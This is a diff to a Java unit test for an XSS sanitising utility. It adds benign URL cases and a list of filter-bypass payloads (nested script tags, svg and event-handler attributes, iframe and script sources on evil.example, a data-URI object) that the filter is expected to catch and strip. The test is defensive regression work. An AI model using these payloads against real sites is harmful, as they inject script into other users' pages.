@@ -20,6 +20,8 @@ import org.junit.jupiter.params.provider.Arguments;
 import org.junit.jupiter.params.provider.MethodSource;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertTrue;
 
 public class XSSUtilTest {
 
@@ -59,7 +61,9 @@ public class XSSUtilTest {
             false,
             "http://gbif.org/login.do?email=sven@gbif.org&password=xyz"),
         Arguments.of("http://www.gbif.org/ipt", false, null),
-        Arguments.of("http://api.gbif.org/v1/occurrence/search?year=1800", false, null));
+        Arguments.of("http://api.gbif.org/v1/occurrence/search?year=1800", false, null),
+        Arguments.of("http://api.gbif.org/v1/dataset?onlyPublished=true&online=1", false, null),
+        Arguments.of("Abundance < 5 and condition = good", false, null));
   }
 
   @ParameterizedTest
@@ -70,5 +74,31 @@ public class XSSUtilTest {
     if (containsXSS) {
       assertEquals(stripXSSValue, XSSUtil.stripXSS(value));
     }
+  }
+
+  /** Bypasses of the earlier patterns (gbif/informatics#63). */
+  public static Stream<String> bypasses() {
+    return Stream.of(
+        "<scr<script>ipt>alert(1)",
+        "<scr<script>ipt>alert(1)</script>",
+        "<<script>script>alert(1)<</script>/script>",
+        "<script/src=//evil.example/x.js></script>",
+        "<svg onload=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "<div onanimationstart=alert(1) style=animation-name:x>",
+        "<a href=x onpointerenter=alert(1)>x</a>",
+        "<body onpageshow=alert(1)>",
+        "<iframe src=//evil.example></iframe>",
+        "<object data=\"data:text/html,<script>alert(1)</script>\"></object>");
+  }
+
+  @ParameterizedTest
+  @MethodSource("bypasses")
+  public void testBypassesAreCaught(String value) {
+    assertTrue(XSSUtil.containsXSS(value), value);
+
+    String stripped = XSSUtil.stripXSS(value);
+    assertFalse(XSSUtil.containsXSS(stripped), stripped);
+    assertFalse(stripped.toLowerCase().contains("<script"), stripped);
   }
 }
